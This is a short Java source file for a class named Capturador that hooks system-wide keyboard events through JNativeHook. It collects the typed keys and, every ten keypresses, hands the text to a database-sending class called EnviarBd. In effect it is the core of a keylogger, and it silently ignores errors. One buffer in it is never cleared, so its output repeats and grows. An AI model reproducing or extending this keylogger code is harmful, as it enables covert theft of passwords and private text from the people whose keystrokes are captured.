package tech.leonam;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import tech.leonam.dao.EnviarBd;

public class Capturador implements NativeKeyListener {
    private String aSerEnviado = "";
    private String letraPressionada = "";
    private int i = 0;
    public static final int numeroDeCaracteresASerEnviado = 10;

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try {
            try {
                letraPressionada += NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
            } catch (Exception ex) {
                letraPressionada += " ";
            }
            aSerEnviado += letraPressionada;
            i++;
            if (i >= numeroDeCaracteresASerEnviado) {
                new EnviarBd(aSerEnviado);
                i = 0;
                aSerEnviado = "";
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
